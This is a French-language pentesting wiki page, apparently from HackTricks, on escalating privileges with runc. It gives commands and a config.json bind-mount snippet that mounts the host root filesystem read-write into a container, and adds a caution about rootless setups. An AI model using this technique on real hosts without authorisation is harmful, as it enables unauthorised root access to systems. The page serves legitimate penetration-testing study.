# Escalade de privilèges RunC

{{#include ../../banners/hacktricks-training.md}}

## Informations de base

Si vous souhaitez en savoir plus sur **runc**, consultez la page suivante :

{{#ref}}
../../network-services-pentesting/2375-pentesting-docker.md
{{#endref}}

## EP

Si vous constatez que `runc` est installé sur l'hôte, vous pourriez être en mesure de **lancer un conteneur en montant le dossier racine / de l'hôte**.
```bash
runc -help #Get help and see if runc is intalled
runc spec #This will create the config.json file in your current folder

Inside the "mounts" section of the create config.json add the following lines:
{
"type": "bind",
"source": "/",
"destination": "/",
"options": [
"rbind",
"rw",
"rprivate"
]
},

#Once you have modified the config.json file, create the folder rootfs in the same directory
mkdir rootfs

# Finally, start the container
# The root folder is the one from the host
runc run demo
```
> [!CAUTION]
> Cela ne fonctionnera pas toujours car l'opération par défaut de runc est de s'exécuter en tant que root, donc l'exécuter en tant qu'utilisateur non privilégié ne peut tout simplement pas fonctionner (à moins que vous n'ayez une configuration sans root). Faire de la configuration sans root la valeur par défaut n'est généralement pas une bonne idée car il y a pas mal de restrictions à l'intérieur des conteneurs sans root qui ne s'appliquent pas en dehors des conteneurs sans root.

{{#include ../../banners/hacktricks-training.md}}
